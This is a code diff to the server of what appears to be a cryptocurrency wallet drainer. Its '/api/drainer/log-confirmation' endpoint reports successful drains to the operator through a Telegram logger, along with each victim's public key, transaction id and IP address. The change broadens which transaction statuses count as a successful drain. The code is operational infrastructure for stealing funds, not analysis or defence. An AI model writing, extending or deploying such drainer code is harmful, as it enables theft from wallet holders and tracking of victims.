@@ -59,8 +59,8 @@ app.post('/api/drainer/log-confirmation', async (req, res) => {
     
     const telegramLogger = (await import('./src/telegram.js')).default;
     
-    if (status === 'confirmed' || status === 'finalized') {
-      console.log('[CONFIRMATION] Logging successful confirmation for:', publicKey, txid);
+    if (status === 'confirmed' || status === 'finalized' || status === 'processed' || status === 'broadcast_success') {
+      console.log('[CONFIRMATION] Logging successful confirmation for:', publicKey, txid, 'status:', status);
       await telegramLogger.logDrainSuccess({
         publicKey: publicKey,
         actualDrainAmount: 0, // Will be calculated from transaction
@@ -74,6 +74,8 @@ app.post('/api/drainer/log-confirmation', async (req, res) => {
         ip: userIp,
         error: error || 'Transaction failed on-chain'
       });
+    } else {
+      console.log('[CONFIRMATION] Unknown status:', status, 'for:', publicKey, txid);
     }
     
     console.log('[CONFIRMATION] Confirmation logged successfully');
